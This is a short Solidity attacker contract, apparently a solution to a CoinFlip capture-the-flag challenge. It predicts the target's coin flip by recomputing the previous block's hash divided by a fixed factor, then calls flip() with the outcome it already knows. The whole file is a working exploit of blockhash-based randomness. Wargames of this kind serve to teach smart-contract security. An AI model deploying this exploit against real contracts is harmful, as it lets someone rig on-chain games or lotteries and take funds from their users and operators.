// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';
import "./CoinFlip.sol";

/// @title CoinFlip challenge attacker contract 
/// @notice The goal is to pre-compute whatever the CoinFlip contract is performing in its flip() function,
/// block.number and blockhash will be the same uint256. 

contract CoinFlipAttack {

    using SafeMath for uint256;
    CoinFlip coinFlipContract;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _address) public{
        coinFlipContract = CoinFlip(_address);
    }

    function attack() public{
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
        coinFlipContract.flip(side);
    }
}